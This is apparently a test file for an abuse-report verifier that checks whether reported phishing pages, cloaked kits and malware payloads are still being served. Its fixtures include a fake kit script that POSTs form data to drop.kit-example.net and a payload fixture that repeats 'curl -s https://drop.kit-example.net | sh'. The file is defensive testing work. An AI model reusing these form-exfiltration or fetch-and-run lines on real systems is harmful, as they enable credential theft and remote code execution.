import { describe, expect, test } from "bun:test";

import { validateAbuseReportRequest } from "../abuse/contracts";
import { AbuseRepository } from "../abuse/repository";
import { ArtifactsEntity } from "../db/entities/artifacts";
import { SubmissionsEntity } from "../db/entities/submissions";
import { useTemporaryDatabase } from "../db/test_helpers";
import { generateId } from "../db/ids";
import { sha256Hex } from "../util/hash";
import { WebsiteCaptureFailedError, WebsiteHostOfflineError, WebsiteUnreachableError } from "../website/archive/errors";
import type { SiteWalk, WebsiteArchiveResult } from "../website/archive/types";
import { scriptedSiteVisit, type ScriptedPage } from "../site_visit/test_helpers";
import { kitCapture, templatePage } from "../website/test_mhtml";
import type { WebsiteKitResource } from "../website/types";
import { CONTENT_VERIFIED_EVENT, contentVerificationsOf, stillAbusive, verifyReportedContent, type ContentVerificationDependencies } from "./content";

useTemporaryDatabase();

const HOST = "login.kit-example.com";
const URL_ = `https://${HOST}/verify`;
const NOW = new Date("2026-11-20T10:00:00Z");
/** The kit's own script, as the case captured it. */
const KIT_JS = `(()=>{const steal=(f)=>fetch("https://drop.kit-example.net/c",{method:"POST",body:new FormData(f)});${"/*kit*/".repeat(200)}})();`;
const LIBRARY_JS = `/*! jQuery v3.7.1 */${"x".repeat(2_000)}`;

/** The kit's page as its server sends it: per-request tokens change the body, never its template. */
const kitPage = (host: string, token = "a1") => `<html><head><title>Verify</title></head><body><input type="hidden" name="csrf" value="${token}">${templatePage(10, (card) => `Confirm your ${host} account ${card} `.repeat(4))}</body></html>`;
/** What a cloaking kit shows plain requests and reviewers. */
const DECOY = `<html><head><title>Welcome</title></head><body>${templatePage(6, (card) => `Our bakery menu item ${card} `.repeat(5), () => "menu")}</body></html>`;

type Answer = { status?: number; body: string | Buffer; type?: string } | ((headers: Headers) => { status?: number; body: string | Buffer; type?: string });

/** A site answering by URL, recording every request; DNS resolves unless `gone`. */
function site(answers: Record<string, Answer>, options: { gone?: boolean } = {}) {
	const requested: string[] = [];
	const dependencies: ContentVerificationDependencies["site"] = {
		dns: {
			resolve4: async () => {
				if (options.gone) throw Object.assign(new Error("ENOTFOUND"), { code: "ENOTFOUND" });
				return ["203.0.113.10"];
			},
			resolve6: async () => { throw Object.assign(new Error("ENODATA"), { code: options.gone ? "ENOTFOUND" : "ENODATA" }); },
			resolveCname: async () => { throw Object.assign(new Error("ENOTFOUND"), { code: "ENOTFOUND" }); },
		},
		rdap: { rdapLocator: async () => undefined },
		assertPublicHost: async () => undefined,
		now: () => NOW,
		fetch: async (input, init) => {
			const url = input.toString();
			requested.push(url);
			const answer = answers[url];
			if (!answer) return new Response("Not Found", { status: 404, headers: { "content-type": "text/html" } });
			const { status = 200, body, type = "text/html" } = typeof answer === "function" ? answer(new Headers(init?.headers)) : answer;
			return new Response(typeof body === "string" ? body : new Uint8Array(body), { status, headers: { "content-type": type } });
		},
	};
	return { requested, dependencies };
}

/** A browser capture of `url` that ended on `html`, with its raw document and kit files. */
function capture(url: string, html: string, options: { rawBody?: string; kitResources?: WebsiteKitResource[]; cloaked?: boolean; mhtml?: Buffer } = {}): WebsiteArchiveResult {
	const hostname = new URL(url).hostname;
	return {
		requestedUrl: url,
		url,
		hostname,
		navigationHops: [{ index: 0, url, hostname, status: 200, contentCaptured: true, bodyCaptured: true }],
		hopBodies: [{ hopIndex: 0, body: Buffer.from(options.rawBody ?? html) }],
		archivedAt: NOW,
		mhtml: options.mhtml ?? kitCapture(hostname, "9", { body: html }),
		html: Buffer.from(html),
		text: Buffer.from(html.replace(/<[^>]+>/g, " ")),
		...(options.kitResources ? { kitResources: options.kitResources } : {}),
		...(options.cloaked ? { cloaking: { outcome: "unresolved", detail: "every route saw the decoy" } as WebsiteArchiveResult["cloaking"] } : {}),
	};
}

const resource = (path: string, body: string): WebsiteKitResource => ({ url: `https://${HOST}${path}`, mimeType: "application/javascript", size: Buffer.byteLength(body), sha256: sha256Hex(body) });

/**
 * A reported case: the submission with its walk of the site (the raw page and
 * its MHTML stored as the analysis stores them when `captured`), and its
 * report with one target.
 */
async function reported(options: { rawPage?: string; renderedPage?: string; decoyFirst?: string; kitResources?: WebsiteKitResource[]; payload?: { url: string; sha256: string }; userAgent?: string; noCase?: boolean } = {}) {
	const submissionId = generateId();
	// With `decoyFirst`, the walk first got a decoy on the same site and passed it (hop 0), then the kit (hop 1), which the case judged.
	const judged = options.decoyFirst === undefined ? 0 : 1;
	const hops = [
		...(options.decoyFirst === undefined ? [] : [{ index: 0, url: `https://${HOST}/`, hostname: HOST, status: 200, contentCaptured: false, bodyCaptured: true, redirectTo: URL_ }]),
		{ index: judged, url: URL_, hostname: HOST, status: 200, contentCaptured: true, bodyCaptured: options.rawPage !== undefined },
	];
	const siteAssessments = [{ finding: "phishing", phishingBasis: "credential_form", hopIndex: judged, judgedHopIndex: judged }] as never;
	if (!options.noCase) {
		await SubmissionsEntity.create({ id: submissionId, kind: "website", dedupeKey: `content-${submissionId}`, status: "reported", data: { kind: "website", website: { url: URL_, routes: [{ hops, siteAssessments }], ...(options.kitResources ? { kitResources: options.kitResources } : {}) } } });
		if (options.decoyFirst !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: "chain-hop-0.html", kind: "website_hop_body", buffer: Buffer.from(options.decoyFirst) });
		if (options.rawPage !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: `chain-hop-${judged}.html`, kind: "website_hop_body", buffer: Buffer.from(options.rawPage) });
		if (options.renderedPage !== undefined) await ArtifactsEntity.saveBuffer({ submissionId, name: judged ? "website-step2.mhtml" : "website.mhtml", kind: "website_mhtml", buffer: kitCapture(HOST, "1", { body: options.renderedPage }) });
	}
	const request = await validateAbuseReportRequest({ targets: [HOST], allegationCategory: options.payload ? "malware" : "phishing", description: "Credential phishing page.", observedUrls: [{ target: HOST, urls: [options.payload?.url ?? URL_] }] });
	const report = await AbuseRepository.createReport({
		request: { ...request, ...(options.payload ? { originalRequest: { kind: "malware_payload_host", payload: options.payload } } : {}), ...(options.userAgent ? { reportedUserAgent: options.userAgent } : {}) },
		...(options.noCase ? {} : { submissionId }),
		reporter: {},
	});
	const [target] = await AbuseRepository.listTargets(report.reportId);
	return { submissionId, target: { reportId: report.reportId, targetId: target!.id, url: options.payload?.url ?? URL_ } };
}

/**
 * Browser and classifier stand-ins that record whether they were needed: the
 * first page each visit loads (with the walk it plays when walked on), and
 * the classifier's finding, the same for every page or by the page's address.
 */
function stages(capturePage?: (url: string) => ScriptedPage | Error, verdict: string | ((url: string) => string) = "phishing") {
	const used = { captures: 0, classifications: 0, walks: 0 };
	const walks: SiteWalk[] = [];
	const visit = scriptedSiteVisit(({ url }) => {
		if (!capturePage) throw new Error("The browser was not expected.");
		const result = capturePage(url);
		if (result instanceof Error) throw result;
		return result;
	}, { walks });
	const dependencies: Pick<ContentVerificationDependencies, "visitSite" | "classify" | "isShared"> = {
		visitSite: async (options) => {
			used.captures += 1;
			try {
				return await visit(options);
			} finally {
				used.walks = walks.length;
			}
		},
		classify: async ({ archive }) => {
			used.classifications += 1;
			const finding = typeof verdict === "function" ? verdict(archive.url) : verdict;
			return { finding: finding as "phishing", ...(finding === "phishing" ? {} : { reason: "a bakery menu, nothing asked of visitors" }) };
		},
		isShared: async () => false,
	};
	return { used, dependencies };
}

describe("verifying that the reported content is still served", () => {
	test("a domain that no longer resolves is gone, without a request to the site or a browser", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const { requested, dependencies } = site({ [URL_]: { body: kitPage(HOST) } }, { gone: true });
		const { used, dependencies: browser } = stages();
		const verification = await verifyReportedContent(target, {}, { site: dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "gone", tier: "check", state: "domain_gone", url: URL_ });
		expect(stillAbusive(verification)).toBe(false);
		expect(requested).toEqual([]);
		expect(used).toEqual({ captures: 0, classifications: 0, walks: 0 });
	});

	test("a plain request that gets the case's page by its template is the site serving it, with no browser; a fresh token changes nothing", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST, "token-at-report") });
		const { dependencies } = site({ [URL_]: { body: kitPage(HOST, "token-now") } });
		const { used, dependencies: browser } = stages();
		const verification = await verifyReportedContent(target, {}, { site: dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "served", tier: "fetch", state: "online" });
		expect(verification.verdict === "served" && verification.matches.map((match) => match.kind)).toEqual(["page_structure"]);
		expect(used.captures).toBe(0);
		// The same page byte for byte also matches by body.
		const same = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: kitPage(HOST, "token-at-report") } }).dependencies, ...browser });
		expect(same.verdict === "served" && same.matches.map((match) => match.kind).sort()).toEqual(["page_body", "page_structure"]);
	});

	test("a decoy the walk passed on the same site is no evidence: the reference is the page the case judged", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST), decoyFirst: DECOY });
		const { used, dependencies: browser } = stages((url) => capture(url, DECOY));
		// The site now shows everyone the decoy: a plain request gets it and proves nothing.
		const verification = await verifyReportedContent(target, { maxTier: "browser" }, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "unverified", tier: "browser" });
		expect(used.captures).toBe(1);
		expect(await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: kitPage(HOST, "x") } }).dependencies, ...browser })).toMatchObject({ verdict: "served", tier: "fetch" });
	});

	test("the kit's own script is evidence beside a matching page; alone, a plain request cannot tell it from a file left behind", async () => {
		const kit = resource("/assets/kit.js", KIT_JS);
		const library = resource("/assets/jquery.min.js", LIBRARY_JS);
		const { target } = await reported({ rawPage: kitPage(HOST), kitResources: [kit, library] });
		const files = { [kit.url]: { body: KIT_JS, type: "application/javascript" }, [library.url]: { body: LIBRARY_JS, type: "application/javascript" } };
		const failing = stages(() => new WebsiteCaptureFailedError([new WebsiteUnreachableError("residential", "net::ERR_CONNECTION_RESET")]));
		const online = site({ [URL_]: { body: kitPage(HOST, "n2") }, ...files });
		const verification = await verifyReportedContent(target, {}, { site: online.dependencies, ...failing.dependencies });
		expect(verification).toMatchObject({ verdict: "served", tier: "fetch", matches: [{ kind: "page_structure" }, { kind: "kit_file", sha256: kit.sha256, url: kit.url }] });
		// A library is never fetched as proof.
		expect(online.requested).not.toContain(library.url);
		expect(failing.used.captures).toBe(0);

		// The page was replaced while its script stays behind: the browser must see a page that loads it.
		const replaced = site({ [URL_]: { body: DECOY }, ...files });
		const after = await verifyReportedContent(target, {}, { site: replaced.dependencies, ...failing.dependencies });
		expect(after).toMatchObject({ verdict: "unverified", tier: "browser", state: "online" });
		expect(after.verdict === "unverified" && after.reason).toContain("ERR_CONNECTION_RESET");
		expect(replaced.requested).not.toContain(kit.url);
		// A loader page that loads the kit's script in the browser is the kit, and is learned as its page.
		const loader = `<html><body>${templatePage(5, () => "loading", () => "l")}<script src="/assets/kit.js"></script></body></html>`;
		const loading = stages((url) => capture(url, loader, { kitResources: [kit] }));
		expect(await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: loader }, ...files }).dependencies, ...loading.dependencies })).toMatchObject({ verdict: "served", tier: "browser", matches: [{ kind: "kit_file", url: kit.url }] });
		expect(await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: loader }, ...files }).dependencies, ...loading.dependencies })).toMatchObject({ verdict: "served", tier: "fetch" });
		expect(loading.used.captures).toBe(1);
	});

	test("without a page or kit file recorded, the browser is not started for nothing", async () => {
		const { target } = await reported();
		const { used, dependencies: browser } = stages((url) => capture(url, DECOY));
		expect(await verifyReportedContent(target, { maxTier: "browser" }, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser })).toMatchObject({ verdict: "unverified", tier: "fetch", reason: "The case recorded no page or kit file to compare with." });
		expect(used.captures).toBe(0);
	});

	test("a check the caller already made is used, not repeated", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const { requested, dependencies } = site({ [URL_]: { body: kitPage(HOST) } });
		const { checkSite } = await import("./check");
		const check = await checkSite(URL_, dependencies);
		requested.length = 0;
		expect(await verifyReportedContent(target, {}, { site: dependencies, check, ...stages().dependencies })).toMatchObject({ verdict: "served", tier: "fetch" });
		expect(requested).toEqual([]);
	});

	test("a payload is fetched as the downloader the report names gets it, and matches only byte for byte", async () => {
		const payloadUrl = `https://${HOST}/wksxgj/loader`;
		const bytes = Buffer.from(`#!/bin/zsh\n${"curl -s https://drop.kit-example.net | sh\n".repeat(30)}`);
		// The original request may carry the hash in capitals.
		const { target } = await reported({ payload: { url: payloadUrl, sha256: sha256Hex(bytes).toUpperCase() }, userAgent: "curl/8.7.1", noCase: true });
		const onlyCurl: Answer = (headers) => (headers.get("user-agent")?.startsWith("curl/") ? { body: bytes, type: "application/octet-stream" } : { status: 404, body: "Not Found" });
		const { used, dependencies: browser } = stages();
		const served = await verifyReportedContent(target, {}, { site: site({ [payloadUrl]: onlyCurl }).dependencies, ...browser });
		expect(served).toMatchObject({ verdict: "served", tier: "fetch", matches: [{ kind: "payload", url: payloadUrl, sha256: sha256Hex(bytes) }] });
		// The browser's request gets a 404, so the plain check says removed: the payload is served all the same.
		expect(served.state).toBe("removed");
		expect(used.captures).toBe(0);

		const swapped = await verifyReportedContent(target, { maxTier: "fetch" }, { site: site({ [payloadUrl]: { body: Buffer.from("echo other build"), type: "application/octet-stream" } }).dependencies, ...browser });
		expect(swapped).toMatchObject({ verdict: "unverified", tier: "fetch" });
		// A partial or oversized answer is not the file.
		const partial = await verifyReportedContent(target, { maxTier: "fetch" }, { site: site({ [payloadUrl]: { status: 206, body: bytes, type: "application/octet-stream" } }).dependencies, ...browser });
		expect(partial.verdict).toBe("unverified");
	});

	test("a cloaked site is confirmed by the browser, and the page it got is learned: the next plain request that gets it needs no browser", async () => {
		// The case captured the page rendered only; its raw body was not kept.
		const { target } = await reported({ renderedPage: templatePage(10, (card) => `Confirm your account ${card} `.repeat(4)) });
		const cloaked = site({ [URL_]: { body: DECOY } });
		const rendered = templatePage(10, (card) => `Confirm your account ${card} `.repeat(4));
		const { used, dependencies: browser } = stages((url) => capture(url, rendered, { rawBody: kitPage(HOST, "b1") }));
		const first = await verifyReportedContent(target, {}, { site: cloaked.dependencies, ...browser });
		expect(first).toMatchObject({ verdict: "served", tier: "browser" });
		expect(first.verdict === "served" && first.matches.map((match) => match.kind).sort()).toEqual(["page_body", "page_structure"]);
		expect(first.observed?.structure?.sha256).toMatch(/^[a-f0-9]{64}$/);
		// Deterministic first: the recorded page decides, with no model and no walk.
		expect(used).toEqual({ captures: 1, classifications: 0, walks: 0 });

		// The decoy is never learned: the next plain request still gets it and still needs the browser.
		await verifyReportedContent(target, {}, { site: cloaked.dependencies, ...browser });
		expect(used.captures).toBe(2);
		// The kit stops cloaking: what the browser got is now what a plain request gets.
		const open = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: kitPage(HOST, "c7") } }).dependencies, ...browser });
		expect(open).toMatchObject({ verdict: "served", tier: "fetch", matches: [{ kind: "page_structure" }] });
		expect(used.captures).toBe(2);
		const events = await AbuseRepository.listEvents(target.reportId);
		expect(contentVerificationsOf(events, target.targetId).map((verification) => `${verification.verdict}/${verification.tier}`)).toEqual(["served/browser", "served/browser", "served/fetch"]);
		expect(events.filter((event) => event.eventType === CONTENT_VERIFIED_EVENT).every((event) => event.targetId === target.targetId)).toBe(true);
	});

	test("the kit's scripts from any host count in the browser, by hash", async () => {
		const backend = { url: "https://cdn.kit-backend.net/x/loader.js", mimeType: "application/javascript", size: Buffer.byteLength(KIT_JS), sha256: sha256Hex(KIT_JS) };
		const { target } = await reported({ kitResources: [backend] });
		// The browser ends on another address of the site than the one reported.
		const { dependencies: browser } = stages(() => capture(`${URL_}?step=2`, "<p>changed wording</p>", { kitResources: [backend] }));
		const verification = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "served", tier: "browser", matches: [{ kind: "kit_file", url: backend.url, sha256: backend.sha256 }] });
	});

	test("a changed page goes to the classifier: still phishing is learned like a match, nothing found is not abuse", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const changedRaw = `<html><body>${templatePage(14, (card) => `New wallet login ${card} `.repeat(3), () => "w")}</body></html>`;
		const decoy = site({ [URL_]: { body: DECOY } });
		const phishing = stages((url) => capture(url, changedRaw));
		const changed = await verifyReportedContent(target, {}, { site: decoy.dependencies, ...phishing.dependencies });
		expect(changed).toMatchObject({ verdict: "changed_malicious", tier: "analysis", finding: "phishing" });
		expect(stillAbusive(changed)).toBe(true);
		// The first page is reportable by itself: the agent does not walk on.
		expect(phishing.used).toEqual({ captures: 1, classifications: 1, walks: 0 });
		// A page the classifier judged is never learned as the reported one: it may be another kit, or a mistake.
		const again = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: changedRaw } }).dependencies, ...phishing.dependencies });
		expect(again).toMatchObject({ verdict: "changed_malicious", tier: "analysis" });
		expect(phishing.used).toEqual({ captures: 2, classifications: 2, walks: 0 });

		const benign = stages((url) => capture(url, DECOY), "insufficient_evidence");
		const clean = await verifyReportedContent(target, {}, { site: decoy.dependencies, ...benign.dependencies });
		expect(clean).toMatchObject({ verdict: "not_malicious", tier: "analysis", reason: "a bakery menu, nothing asked of visitors" });
		expect(stillAbusive(clean)).toBe(false);
		// The harmless page was walked on from; the walk reached nothing more.
		expect(benign.used).toEqual({ captures: 1, classifications: 1, walks: 1 });
		// Without the classifier the change stays unverified, and nothing is walked.
		const bounded = await verifyReportedContent(target, { maxTier: "browser" }, { site: decoy.dependencies, ...benign.dependencies });
		expect(bounded).toMatchObject({ verdict: "unverified", tier: "browser" });
		expect(benign.used).toEqual({ captures: 2, classifications: 1, walks: 1 });
	});

	test("a harmless first page is walked on in the same browser: a step the case recorded is served with no model, a reportable step is changed, nothing found says how far the agent got", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const decoy = site({ [URL_]: { body: DECOY } });
		const landing = (steps: WebsiteArchiveResult[]): ScriptedPage => ({ ...capture(URL_, DECOY), walk: { steps } });

		// The kit's page behind the landing's "Continue": the recorded page decides, no step is classified.
		const behind = stages(() => landing([capture(`https://${HOST}/step`, kitPage(HOST, "s2"))]), (url) => url === URL_ ? "insufficient_evidence" : "phishing");
		const served = await verifyReportedContent(target, {}, { site: decoy.dependencies, ...behind.dependencies });
		expect(served).toMatchObject({ verdict: "served", tier: "browser" });
		expect(behind.used).toEqual({ captures: 1, classifications: 1, walks: 1 });

		// A new kit behind the landing: the first step matches nothing, the second is reportable and ends the checks.
		const wallet = `<html><body>${templatePage(12, (card) => `Restore your wallet ${card} `.repeat(3), () => "seed")}</body></html>`;
		const steps = [capture(`https://${HOST}/about`, DECOY), capture(`https://${HOST}/restore`, wallet), capture(`https://${HOST}/never`, wallet)];
		const changed = stages(() => landing(steps), (url) => url.endsWith("/restore") ? "phishing" : "insufficient_evidence");
		const verdict = await verifyReportedContent(target, {}, { site: decoy.dependencies, ...changed.dependencies });
		expect(verdict).toMatchObject({ verdict: "changed_malicious", tier: "analysis", finding: "phishing" });
		expect(changed.used).toEqual({ captures: 1, classifications: 3, walks: 1 });

		const nothing = stages(() => landing(steps.slice(0, 1)), "insufficient_evidence");
		expect(await verifyReportedContent(target, {}, { site: decoy.dependencies, ...nothing.dependencies })).toMatchObject({
			verdict: "not_malicious",
			tier: "analysis",
			reason: "a bakery menu, nothing asked of visitors Nothing reportable on the 1 page the visiting agent reached from it either.",
		});
		expect(nothing.used).toEqual({ captures: 1, classifications: 2, walks: 1 });

		// A walk blocked by a challenge or failing before finding anything reportable stays unverified, never not_malicious.
		const blocked = stages(() => ({
			...capture(URL_, DECOY),
			walk: { steps: [], agent: { outcome: "completed", report: { asksForPhone: false, blockedByChallenge: true, stoppedReason: "Turnstile stayed unsolved" }, actions: [] } },
		}), "insufficient_evidence");
		expect(await verifyReportedContent(target, {}, { site: decoy.dependencies, ...blocked.dependencies })).toMatchObject({
			verdict: "unverified",
			tier: "analysis",
		});
	});

	test("a host the browser finds gone on every network, with its name confirmed missing, is gone", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const offline = new WebsiteHostOfflineError(HOST, { cause: new WebsiteCaptureFailedError([new WebsiteUnreachableError("residential", "net::ERR_TUNNEL_CONNECTION_FAILED")]) });
		const { used, dependencies: browser } = stages(() => offline);
		const verification = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "gone", tier: "browser" });
		expect(stillAbusive(verification)).toBe(false);
		expect(used.classifications).toBe(0);
	});

	test("a site that shows every network a decoy is unverified and never classified", async () => {
		const { target } = await reported({ rawPage: kitPage(HOST) });
		const { used, dependencies: browser } = stages((url) => capture(url, DECOY, { cloaked: true }));
		const verification = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "unverified", tier: "browser", reason: "The site showed every network a decoy." });
		expect(used).toMatchObject({ classifications: 0, walks: 0 });
	});

	test("a report without a case has nothing to classify the page with", async () => {
		const { target } = await reported({ noCase: true });
		const { used, dependencies: browser } = stages((url) => capture(url, DECOY));
		const verification = await verifyReportedContent(target, {}, { site: site({ [URL_]: { body: DECOY } }).dependencies, ...browser });
		expect(verification).toMatchObject({ verdict: "unverified", tier: "analysis" });
		expect(used).toEqual({ captures: 1, classifications: 0, walks: 0 });
	});
});
